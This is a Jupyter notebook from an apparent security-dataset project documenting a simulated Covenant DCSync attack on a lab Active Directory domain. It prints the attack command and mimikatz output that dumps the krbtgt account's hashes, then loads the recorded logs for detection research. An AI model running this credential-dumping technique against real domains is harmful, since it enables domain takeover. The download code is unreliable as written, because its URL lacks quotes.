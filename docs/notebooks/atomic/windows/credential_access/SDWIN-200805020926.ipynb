{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b6aa01a7",
   "metadata": {},
   "source": [
    "# Covenant DCSync"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b9300c9a",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "86ab73fa",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/08/05 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.006](https://attack.mitre.org/techniques/T1003/006) |\n",
    "| Tags              | AD Replication Services,RPC DRSUAPI DsGetNCChanges |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f8c45fb6",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "21d2f4fc",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "62266dc8",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ee09ac02",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a9f041ad",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "626427c1",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Covenant | [DCSync](https://github.com/cobbr/Covenant/blob/c4d7eba0cfc29e3d5961248ec984a209d4d05de3/Covenant/Data/Tasks/SharpSploit.Credentials.yaml) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d61ac21f",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(wardog) > DCSync /username:\"krbtgt\" /fqdn:\"theshire.local\" /dc:\"MORDORDC\"\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #17763 Apr  9 2019 23:22:27\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:theshire.local /dc:MORDORDC\n",
    "[DC] 'theshire.local' will be the domain\n",
    "[DC] 'MORDORDC' will be the DC server\n",
    "[DC] 'krbtgt' will be the user account\n",
    "\n",
    "Object RDN           : krbtgt\n",
    "\n",
    "** SAM ACCOUNT **\n",
    "\n",
    "SAM Username         : krbtgt\n",
    "Account Type         : 30000000 ( USER_OBJECT )\n",
    "User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\n",
    "Account expiration   : \n",
    "Password last change : 8/4/2020 9:30:22 PM\n",
    "Object Security ID   : S-1-5-21-3669966080-2286457517-972388166-502\n",
    "Object Relative ID   : 502\n",
    "\n",
    "Credentials:\n",
    "  Hash NTLM: 9810d5b30826619ed962194bc35cb66d\n",
    "    ntlm- 0: 9810d5b30826619ed962194bc35cb66d\n",
    "    lm  - 0: 2bd18bfa988700fc1f845909043f7785\n",
    "\n",
    "Supplemental Credentials:\n",
    "* Primary:NTLM-Strong-NTOWF *\n",
    "    Random Value : d7477916da5d01ca6366caaad478f535\n",
    "\n",
    "* Primary:Kerberos-Newer-Keys *\n",
    "    Default Salt : THESHIRE.LOCALkrbtgt\n",
    "    Default Iterations : 4096\n",
    "    Credentials\n",
    "      aes256_hmac       (4096) : 1ffb5b5ca0ba20b19de132f44a580d67c96362f4ec21c8e8057ad8b4a5cbe99e\n",
    "      aes128_hmac       (4096) : 49e4ec6edd3d27f0eda5ed4b32df29c4\n",
    "      des_cbc_md5       (4096) : f162e6c46b5d10e9\n",
    "\n",
    "* Primary:Kerberos *\n",
    "    Default Salt : THESHIRE.LOCALkrbtgt\n",
    "    Credentials\n",
    "      des_cbc_md5       : f162e6c46b5d10e9\n",
    "\n",
    "* Packages *\n",
    "    NTLM-Strong-NTOWF\n",
    "\n",
    "* Primary:WDigest *\n",
    "    01  1e9687e12c22c61ce56e06b679067068\n",
    "    02  bd4ff4a6ad0092c086110d7f177bf2dd\n",
    "    03  bef34dc3488c458be7a07de25cee5c25\n",
    "    04  1e9687e12c22c61ce56e06b679067068\n",
    "    05  bd4ff4a6ad0092c086110d7f177bf2dd\n",
    "    06  ec54a02a8b4c407023b921f839db0695\n",
    "    07  1e9687e12c22c61ce56e06b679067068\n",
    "    08  34460bb2c44aae9f8397a5df0846babd\n",
    "    09  34460bb2c44aae9f8397a5df0846babd\n",
    "    10  0a104dba17fcb7b32f0a39c5694ae42d\n",
    "    11  cec2d9932979ed578ba260b233290ad6\n",
    "    12  34460bb2c44aae9f8397a5df0846babd\n",
    "    13  dbd9ff299298ee7649121015643a45c0\n",
    "    14  cec2d9932979ed578ba260b233290ad6\n",
    "    15  2d5f29cfd994b4a31dc71ff0d4f4b735\n",
    "    16  2d5f29cfd994b4a31dc71ff0d4f4b735\n",
    "    17  1a6e2adbc126ac59916af47ca0c2047d\n",
    "    18  b99ae20fdbff05738cc3c4341f5819b0\n",
    "    19  791ed67574eee311ed74e911f840e622\n",
    "    20  71d939df702fe13f003e39b9421f450d\n",
    "    21  cc9c9f66309c5d6412773943efa08efd\n",
    "    22  cc9c9f66309c5d6412773943efa08efd\n",
    "    23  1f076ec382ae6f7cf5ca3750ad70c140\n",
    "    24  a16cb7dc0b7a969d65aff54a4180d63a\n",
    "    25  a16cb7dc0b7a969d65aff54a4180d63a\n",
    "    26  80706a2b93f2a4d53d6df1b4b8bfe029\n",
    "    27  c3c8bedd3c2f3db046410f60ab728f57\n",
    "    28  e0b5d1db4b2119a9e621a2a3199828bb\n",
    "    29  b23dd36a70988139bbee48c668232993\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "acc377bb",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c4b57e6c",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4f19124",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "23484370",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5569e760",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c399a36",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3eafb3fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3f0d55cc",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/](https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
